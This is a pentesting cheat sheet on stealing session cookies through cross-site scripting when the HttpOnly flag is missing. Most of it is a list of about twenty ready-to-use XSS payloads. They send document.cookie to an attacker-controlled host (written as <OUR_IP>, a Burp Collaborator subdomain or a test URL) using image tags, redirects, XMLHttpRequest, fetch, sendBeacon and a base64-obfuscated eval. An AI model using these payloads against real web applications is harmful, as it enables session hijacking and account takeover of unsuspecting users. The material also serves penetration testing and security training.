# Cookie-Based Privilege Escalation

We can leverage XSS to steal cookies and session information

**Relevant flags:**

- **Secure** - Instructs the browser to only send the cookie over encrypted connections (HTTPS)
- **HttpOnly** - Denies JavaScript access to the cookie

If **HttpOnly** is not set, we can leverage XSS to steal a cookie (although there are potential bypasses linked below)

### Examples

```js
// Using image tag on error event
<img src=x onerror=this.src="http://<OUR_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<OUR_IP>/?c='+ document.cookie">

// Using image and audio objects
<script>new Image().src="http://<OUR_IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<OUR_IP>/?c="+escape(document.cookie);</script>
<script>var i=new Image();i.src="http://<OUR_IP>/?c="+document.cookie</script>

// Using document location manipulation
<script>location.href = 'http://<OUR_IP>/?c='+document.cookie</script>
<script>location = 'http://<OUR_IP>/?c='+document.cookie</script>
<script>document.location = 'http://<OUR_IP>/?c='+document.cookie</script>
<script>document.location.href = 'http://<OUR_IP>/?c='+document.cookie</script>
<script>window.location.assign('http://<OUR_IP>/?c='+document.cookie)</script>
<script>window['location']['assign']('http://<OUR_IP>/?c='+document.cookie)</script>
<script>window['location']['href']('http://<OUR_IP>/?c='+document.cookie)</script>
<script>document.location=["http://<OUR_IP>?c",document.cookie].join()</script>
<script>window.location="https://<OUR_IP>/?c=".concat(document.cookie)</script>

// Using document.write
<script>document.write('<img src="http://<OUR_IP>?c='+document.cookie+'" />')</script>

// Using XMLHttpRequest
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<OUR_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>

// Using eval() to decode and execute base64 encoded script
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxPVVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
// The base64 encoded payload: document.write("<img src='https://<OUR_IP>?c="+ document.cookie +"' />")

// Using fetch API
<script>fetch('https://<OUR_SUBDOMAIN>.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>

// Using beacon API
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```

See [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-common-payloads) for additional techniques and bypasses
